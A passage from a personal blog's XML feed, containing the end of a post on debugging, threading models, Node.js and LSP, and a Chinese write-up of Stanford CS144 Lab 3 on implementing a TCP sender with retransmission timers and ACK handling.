reproduce.</strong></li><li>You need to analyze the fault <strong>on a different machine or share debugging data</strong>.</li></ul><p>Use GDB Without Core Dumps When:</p><ul><li>You can r<strong>eproduce the issue</strong> easily in your environment.</li><li>You want to interactively explore the program’s state (e.g., set breakpoints before the crash).</li><li>You’re debugging a long-running or server process where <strong>capturing a live snapshot is more efficient</strong> than generating a dump.</li></ul><h2 id="user-level-and-kernel-level-multithreading"><a class="markdownIt-Anchor" href="#user-level-and-kernel-level-multithreading"></a> User-level and Kernel-level Multithreading</h2><p>The key difference between <strong>explicitly user-level thread libraries</strong> (e.g., <code>pthread</code> or <code>windows.h</code>) and <strong>implicitly kernel-level thread abstractions</strong> (e.g., thread pools, OpenMP, or GCD) lies in <strong>control granularity</strong> and <strong>abstraction level</strong>, which affects <strong>how threads are managed</strong> and <strong>who is responsible for managing them</strong>.</p><h3 id="1-user-level-thread-libraries-explicit-control"><a class="markdownIt-Anchor" href="#1-user-level-thread-libraries-explicit-control"></a> 1. User-Level Thread Libraries (Explicit Control)</h3><p>Examples: <code>pthread</code> (POSIX threads), <code>windows.h</code> (Windows threading API)</p><h4 id="characteristics"><a class="markdownIt-Anchor" href="#characteristics"></a> Characteristics:</h4><ul><li><strong>Explicit Thread Management:</strong><br>The programmer directly creates, manages, and synchronizes threads using APIs like <code>pthread_create</code>, <code>pthread_join</code>, or <code>CreateThread</code>.</li><li><strong>Fine-Grained Control:</strong><br>The library exposes lower-level primitives, allowing the programmer to:<ul><li>Decide when and how to create threads.</li><li>Explicitly synchronize threads with mutexes, condition variables, etc.</li><li>Handle thread termination and resource cleanup.</li></ul></li><li><strong>User-Space Scheduling:</strong><br>If implemented as purely user-level threads (like in the Many-to-One model), the kernel may not even be aware of these threads, and the thread library handles scheduling in user space. This provides lightweight thread management but can suffer from blocking issues.</li></ul><h3 id="2-kernel-level-thread-libraries-implicit-abstractions"><a class="markdownIt-Anchor" href="#2-kernel-level-thread-libraries-implicit-abstractions"></a> 2. Kernel-Level Thread Libraries (Implicit Abstractions)</h3><p>Examples: Thread pools, OpenMP (<code>omp.h</code>), Grand Central Dispatch (GCD)</p><h4 id="characteristics-2"><a class="markdownIt-Anchor" href="#characteristics-2"></a> Characteristics:</h4><ul><li><strong>Higher-Level Abstractions:</strong><br>These libraries or frameworks hide most of the low-level thread management details from the programmer. <u>Instead of directly managing threads, you typically submit <strong>task</strong> or use <strong>parallel constructs</strong>, and the system determines how threads are allocated</u>.</li><li><strong>Kernel-Managed Threads:</strong><br>These abstractions often rely on kernel threads for execution, meaning the kernel scheduler handles thread creation, termination, and context switching.</li><li><strong>Dynamic Resource Management:</strong><br>They dynamically adjust thread usage to match the available hardware resources (e.g., CPU cores) and workload. For example:<ul><li><strong>Thread pools</strong> reuse threads to minimize thread creation and destruction overhead.</li><li><strong>OpenMP</strong> dynamically distributes work across threads with constructs like <code>#pragma omp parallel for</code>.</li><li><strong>GCD</strong> (on Apple platforms) uses queues to schedule tasks onto kernel threads efficiently.</li></ul></li></ul><h3 id="why-they-seem-the-same-to-programmers"><a class="markdownIt-Anchor" href="#why-they-seem-the-same-to-programmers"></a> Why They “Seem the Same” to Programmers</h3><p>From a usability perspective, they may feel similar because:</p><ol><li>Both allow concurrent execution.</li><li>The higher-level abstractions are designed to make concurrency <strong>easier</strong>, hiding the underlying complexity.<br>However, the <strong>level of abstraction</strong> and <strong>degree of control</strong> are vastly different. If you’re using <code>pthread</code>, you’re <strong>explicitly</strong> in charge of the threads, while with something like OpenMP or GCD, you’re simply defining tasks, and the <strong>framework/library manages everything else</strong>.</li></ol><hr><h1 id="一些概念"><a class="markdownIt-Anchor" href="#一些概念"></a> 一些概念</h1><h2 id="what-is-nodejs"><a class="markdownIt-Anchor" href="#what-is-nodejs"></a> What is Node.js</h2><p>Node.js is an open-source and cross-platform <strong>JavaScript runtime environment</strong>, used for executing JavaScript code outside of a web browser.</p><p>There are a number of characteristics that make Node.js what it is:</p><ul><li><strong>Google Chrome V8 JavaScript Engine:</strong> <u>This runtime environment is built on the Google Chrome V8 JavaScript runtime engine.</u> In the same way a Java Virtual Machine translates bytecode, the Chrome V8 JavaScript engine takes JavaScript and makes it readable.</li><li><strong>Modules/Packages:</strong> Node.js has npm, a node package manager, with a library of over 350,000 packages to help get your project or application off the ground with efficiency and ease.</li><li><strong>Event Driven, Single-Threaded I/O Model:</strong> <u>JavaScript relies on user interactions or events to run. </u>In most cases, code is run synchronously. Server requests and other such asynchronous tasks rely on a system of promises or async/await functions to handle these inputs and outputs.</li></ul><h2 id="what-is-sandbox"><a class="markdownIt-Anchor" href="#what-is-sandbox"></a> What is Sandbox</h2><blockquote><p>In <a href="https://en.wikipedia.org/wiki/Computer_security" title="Computer security">computer security</a>, a <em>sandbox</em> is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or software vulnerabilities from spreading.</p><p>The “sandbox” metaphor derives from the concept of a child’s sandbox—a play area where kids can build, destroy, and experiment without causing any real-world damage.</p></blockquote><h2 id="language-server-protocol-lsp"><a class="markdownIt-Anchor" href="#language-server-protocol-lsp"></a> Language Server Protocol (LSP)</h2><p>In the context of the Language Server Protocol (LSP), “client” and “server” refer to the two main components involved in the communication and execution of language-related tasks.</p><ol><li><strong>Client</strong>: The client is typically an editor or integrated development environment (IDE) like Visual Studio Code, Vim, or any other text editor that supports LSP. <strong>The client is responsible for initiating requests for language features</strong> such as autocomplete, syntax highlighting, go-to-definition, and error-checking. In short, the client sends requests to the server to receive language-specific functionality and displays the results to the user.</li><li><strong>Server</strong>: The server is the language server, which provides language-specific information and features. <strong>It could be a standalone application or a process initiated by the client.</strong> The server responds to client requests by providing data and functionalities like code completion, diagnostics, and symbol information based on the programming language it’s tailored for (e.g., Python, JavaScript, or C++). The server operates by analyzing the code, managing the workspace, and returning relevant information back to the client.</li></ol><p>This client-server architecture in LSP enables any editor that implements an LSP client to interact with multiple language servers, making it a highly flexible and language-agnostic solution for language support in editors.</p><hr><h1 id="一些思考"><a class="markdownIt-Anchor" href="#一些思考"></a> 一些思考</h1><blockquote><p>很多时候, 你会觉得理解某一个知识点是一件简单是事情, 但当你真正动手实践的时候, 你才发现你的之前的理解只是停留在表面.</p></blockquote><blockquote><p>One of the most important spirits of young people like you is to try new things to bade farewell to the past.</p></blockquote><blockquote><p>Remember, learn to use <code>man</code>, learn to use everything. RTFM</p></blockquote><blockquote><p>无论何人要认识什么事物，除了同那个事物接触，即生活于（实践于）那个事物的环境中，是没有法子解决的。</p><p>“秀才不出门，全知天下事”，在技术不发达的古代只是一句空话，在技术发达的现代虽然可以实现这句话，然而真正亲知的是天下实践着的人，那些人在他们的实践中间取得了“知”，经过文字和技术的传达而达到于“秀才”之手，秀才乃能间接地“知天下事”。如果要直接地认识某种或某些事物，便只有亲身参加于变革现实、变革某种或某些事物的实践的斗争中，才能触到那种或那些事物的现象，也只有在亲身参加变革现实的实践的斗争中，才能暴露那种或那些事物的本质而理解他们。 ——《实践论》</p></blockquote><blockquote><p>实践，认识，再实践，再认识。 ——《实践论》</p><ol><li>感性到理性、认知向理论发展的过程</li><li>理论认知和实践经验的辩证关系</li><li>认知和实践的局限性、运动性<br>“某一历史时期下的某一实践过程”</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;preface&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#preface&quot;&gt;&lt;/a&gt; Preface&lt;/h1&gt;
&lt;p&gt;我很喜欢姜夔诗《暗香》中的一句词：“等恁时、重觅幽香，已入小窗横幅”。身处在许多个“当时”的我并未能很好地把握好当</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Standford CS144 Lab 3</title>
    <link href="http://example.com/2024/12/12/CS144-Lab3/"/>
    <id>http://example.com/2024/12/12/CS144-Lab3/</id>
    <published>2024-12-12T13:07:39.704Z</published>
    <updated>2024-12-12T13:08:45.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>时隔一个月又重新回到了 CS144 的实验当中，之所以做得如此之慢，主要原因还是自己能力不够（菜是原罪）。有时以为自己从“感性认知”上升到了“理性认知”，但将其运用到实践中时才发现，原来我还是什么都不懂，依旧停留在发展阶段。技术债方面，花了一周多补了 <em>Git</em> 的理论操作；知识债方面，还在继续边做实验边通过自顶向下复习（甚至可以说是学习）。认知和实践是无法割裂开来的，学习也是如此。同时也要认识到认知、理论和实践都具有时间局部性，唯一不变的就是“变”，惟其如此，才需要认知，实践，再认知，再实践。</p><h1 id="实验概述"><a class="markdownIt-Anchor" href="#实验概述"></a> 实验概述</h1><p><img src="/2024/12/12/CS144-Lab3/%E6%A1%86%E6%9E%B6.png" alt="框架"><br>实验一开始我并没有对这个结构图有比较清晰的认识，但做到后面慢慢地发现它实在是精炼地描绘了整个 TCP Socket。</p><p>由于 TCP 是全双工的 (bidiretional)，所以在 TCP 连接的发起方（发送方）以及连接的响应方（接受方）都是有<code>Sender</code>和<code>Reciever</code>两个部件的，不过为了简化讨论，就暂且称前者为发送方而后者为接收方。在 Lab1 和 Lab2 中我们实现了<code>Receiver</code>部件，在 Lab3 中我们就将实现<code>Sender</code>部件。</p><h1 id="sender-部件"><a class="markdownIt-Anchor" href="#sender-部件"></a> Sender 部件</h1><p>以下介绍的<code>Sender</code>部件涉及一般实现的考虑，而非 CS144 的实验要求。</p><h2 id="1-上层调用"><a class="markdownIt-Anchor" href="#1-上层调用"></a> 1. 上层调用</h2><p><code>Sender</code>的具体动作是事件驱动的 (event-based)。<strong>上层调用 socket 接口写入数据（事件 1）</strong>，此时<code>Sender</code>应该接受数据，但是我们知道在流量控制机制下，<code>Sender</code>会维护一个接收方<code>Receiver</code>的滑动窗口，如果此时窗口已经满了，那么<code>Sender</code>是无法发送新的分组的，此时它有三种响应办法：</p><ol><li>直接拒绝上层的调用请求</li><li>通过信号量和上层进行同步</li><li>将数据缓存在<code>Receiver</code>的缓冲区中</li></ol><p>如果此时窗口没有满，<code>Sender</code>接受数据后直接将其封装成一个分组并发送。既然要在不可靠的 IP 网络上发送一个分组，我们同时需要一种<strong>超时重传机制</strong>来保证数据发送到接受方是完整的、按序的，而超时重传机制的实现部件就是<code>Timer</code>倒计时器。根据不同的重传机制，我们有不同的<code>Timer</code>使用方法：</p><ol><li><strong>GBN (Go Back N steps)</strong>：维护一个<code>Timer</code>，指示的是最早的发送后还未确认的分组，如果超时则重传滑动窗口内的所有 N 个分组。这种策略的缺点很明显：因为发送队列中的一个分组的丢包而重传所有分组，不论是否被接收方正确接受，这些冗余的分组极大地浪费了网络资源。</li><li><strong>SR (Selective Retransmission)</strong>：为每一个分组维护一个独立的<code>Timer</code>，哪个分组超时了就选择地去重传，虽然解决了一部分 GBN 的问题，但使实现更加复杂，同时维护众多<code>Timer</code>也造成了很大的开销。</li></ol><p>在 TCP 的一般实现中，采用的是 GBN 和 SR 混合的一种重传机制。回到刚刚的情况中，我们发送完新的分组后，需要考虑是否要启动<code>Timer</code>：如果此时<code>Timer</code>没有启动，说明这个新发送的分组之前的所有分组都已经确认了（cumulative acknowledge），也就是说网络中没有在发送还没有被接收方确认的分组 (outstanding packets)，此时启动<code>Timer</code>开始为这个分组计时。</p><h2 id="2-timer-过期"><a class="markdownIt-Anchor" href="#2-timer-过期"></a> 2. Timer 过期</h2><p><strong><code>Timer</code>计时结束（事件 2）</strong>，会产生一个中断来告诉<code>Sender</code>需要重传分组。前面提到 TCP 的一般实现是 GBN 和 SR 的混合，在需要重传分组时，只会重传最早的未被确认的分组（而非 GBN 的 N 个分组），同时重启<code>Timer</code>。</p><p>一个超时重传机制除了<code>Timer</code>部件的使用，还应该完善地规定超时的时间间隔：运用统计学的方法，通过接受每一个分组我们可以计算一个样本 RTT 值 (SampleRTT)，通过指数加权移动平均 (Exponential Weighted Moving Average, EWMA) 计算下一个 RTO 值：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>α</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>E</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>+</mo><mi>α</mi><mo>∗</mo><mi>S</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi>R</mi><mi>T</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">EstimatedRTT = (1-α)*EstimatedRTT + α*SampleRTT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>e</mi><mi>v</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>β</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>D</mi><mi>e</mi><mi>v</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>+</mo><mi>β</mi><mo>∗</mo><mi mathvariant="normal">∣</mi><mi>S</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>−</mo><mi>E</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>T</mi><mi>T</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">DevRTT = (1-β)*DevRTT + β*|SampleRTT - EstimatedRTT|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord">∣</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>I</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>a</mi><mi>l</mi><mo>=</mo><mi>E</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>+</mo><mn>4</mn><mo>∗</mo><mi>D</mi><mi>e</mi><mi>v</mi><mi>R</mi><mi>T</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">TimeoutInterval = EstimatedRTT + 4 *DevRTT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><p>所以当遇到超时的情况，我们会根据上述公式更新<code>Timer</code>的时间间隔 RTO 值。虽然看不懂上面的公式 😦 ，TCP 的具体实践中一般也只会在重置 RTO 时才会用到，遇到超时重传会简单地加倍时间间隔，比如初始的 RTO 是 1 秒，遇到第一次超时会加倍到 2 秒，第二次超时就加倍到 4 秒。当然 RTO 的值也不是一直指数超级加倍的，遇到特定情况会重置 RTO。</p><h2 id="3-接受到-ack"><a class="markdownIt-Anchor" href="#3-接受到-ack"></a> 3. 接受到 ACK</h2><p><strong>当<code>Sender</code>接受到接收方发送的 ACK 时（事件 3）</strong>，最关心的一个字段是确认号 (acknowledge number, ackno)。这个 ACK 序号有三种可能：</p><ol><li>ackno 小于最早未确认的分组序号，也就是说<code>Receiver</code>冗余地发送了 ACK</li><li>ackno 恰好等于最早未确认的分组序号 (send_base)</li><li>ackno 大于最早未确认的分组序号</li></ol><p>冗余 ACK 涉及<code>Sender</code>的快速重传机制，为了不让逻辑变得太复杂，在此就先不介绍了。在第二个情况下<code>ackno = send_base</code>，即接受方重复确认了最新的确认分组，所以这意味着发生了丢包，因此如我们在事件 1 和事件 2 提到的那样，会重传最早的未确认分组，加倍 RTO，如果<code>Timer</code>未启动则启动。在第三个情况下<code>ackno &gt; send_base</code>，也就是接收方确认了一个新的分组，由于累积确认，我们可以更新<code>send_base</code>，将滑动窗口向前移动，同时发送已经封装好的分组，还要重启<code>Timer</code>。（真的很复杂）</p><h1 id="lab3-tcpsender-的功能"><a class="markdownIt-Anchor" href="#lab3-tcpsender-的功能"></a> Lab3 TCPSender 的功能</h1><ul><li>追踪<code>Reciever</code>的 window size，实现流量控制</li><li>只要接收方窗口没有满，或者上层没有数据发送下来，<code>Sender</code>都应该将数据封装成 segment 后持续地发送给接收方</li><li>通过维护一个 outstanding packets 的集合来追踪发送出去但还未接收的分组</li><li>实现超时重传机制</li></ul><p>下面是实验相关的细节问题：</p><blockquote><p>关于<code>tick()</code>：Periodically, the owner of the TCPSender will call the TCPSender’s tick method, indicating the passage of time.<br>什么时候启动<code>timer</code>：Every time a segment containing data is sent, if the timer is not running we should then start it up.<br>如何发送一个分组：Push it on to the <code>segments_out_queue</code>. As far as your <code>TCPSender</code> is concerned, <strong>consider it sent as soon as you push it on to this queue</strong>. Soon the owner will come along and pop it (using the public <code>segments_out()</code> accessor method) and really send it.<br>当滑动窗口大小为 0 时：If the receiver has announced a window size of zero, the fill window method should <strong>act like the window size is one</strong>.</p></blockquote><h1 id="总结与反思"><a class="markdownIt-Anchor" href="#总结与反思"></a> 总结与反思</h1><p>Timer 的设计 --&gt; 设计模式的学习 --&gt; 在实践中理解</p><hr><h1 id="实验过程中碰到的问题"><a class="markdownIt-Anchor" href="#实验过程中碰到的问题"></a> 实验过程中碰到的问题</h1><h2 id="1-make-编译错误"><a class="markdownIt-Anchor" href="#1-make-编译错误"></a> 1. make 编译错误</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS144_Lab/libsponge/tcp_sender.hh:78:16: error: ‘TCPSender::_stream’ will be initialized after [-Werror=reorder]</span><br><span class="line">78 |     ByteStream _stream;</span><br></pre></td></tr></table></figure><p>The error you’re seeing (<code>-Werror=reorder</code>) indicates that your member variables in the initializer list of the constructor are not initialized in the order they are declared in the class. In C++, <strong>member variables are always initialized in the order of declaration in the class</strong>, regardless of the order specified in the constructor initializer list. If the order in the initializer list doesn’t match the order of declaration, it leads to a warning, which in your case is treated as an error due to <code>-Werror</code>.<br>原因：在构造函数的初始化列表中，成员变量没有按照类声明中的顺序进行初始化</p><h2 id="2-syn-报文段发送"><a class="markdownIt-Anchor" href="#2-syn-报文段发送"></a> 2. SYN 报文段发送</h2><p>在初步完成<code>TCPSender</code>后我发现自己的实现并没有去处理好 SYN 包是要在何时发送，通过第一个测试<code>send_ack.cc</code>可以知道，要求实现的 SYN 包都是不负载数据的，<code>Header</code>中的<code>syn</code>字段值为 1，同时这个分组是占据序号空间的。假设此时初始化的随机序号为<code>_isn</code>，那么这个初始化 SYN 包的序号就是_isn，发送后更新<code>_next_seqno = _isn + 1</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.<span class="built_in">execute</span>(ExpectSegment&#123;&#125;.<span class="built_in">with_no_flags</span>().<span class="built_in">with_syn</span>(<span class="literal">true</span>).<span class="built_in">with_payload_size</span>(<span class="number">0</span>).<span class="built_in">with_seqno</span>(isn));</span><br><span class="line">test.<span class="built_in">execute</span>(AckReceived&#123;WrappingInt32&#123;isn + <span class="number">1</span>&#125;&#125;);</span><br></pre></td></tr></table></figure><h2 id="3-知识债tcp-分组序号的概念"><a class="markdownIt-Anchor" href="#3-知识债tcp-分组序号的概念"></a> 3. 知识债：TCP 分组序号的概念</h2><p>以为一个分组所占据的序号区间长度是整个<code>TCPSegment</code>的大小，其实只是算<code>payload</code>的大小，同时<code>SYN</code>和<code>FIN</code>占据一个字节空间，<code>Header</code>是不算的！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">TCPSegment::length_in_sequence_space</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">payload</span>().<span class="built_in">str</span>().<span class="built_in">size</span>() + (<span class="built_in">header</span>().syn ? <span class="number">1</span> : <span class="number">0</span>) + (<span class="built_in">header</span>().fin ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;时隔一个月又重新回到了 CS144 的实验当中，之所以做得如此之慢，主要原因还是自己能力不够（菜是原罪）。有时以为自己从“感性认知”上升到了“理</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Multithreaded Programming</title>
    <link href="http://example.com/2024/12/03/Operating-System-Concepts-Ch4/"/>
    <id>http://example.com/2024/12/03/Operating-System-Concepts-Ch4/</id>
    <published>2024-12-03T09:12:32.577Z</published>
    <updated>2024-12-03T09:16:56.146Z</updated>
    
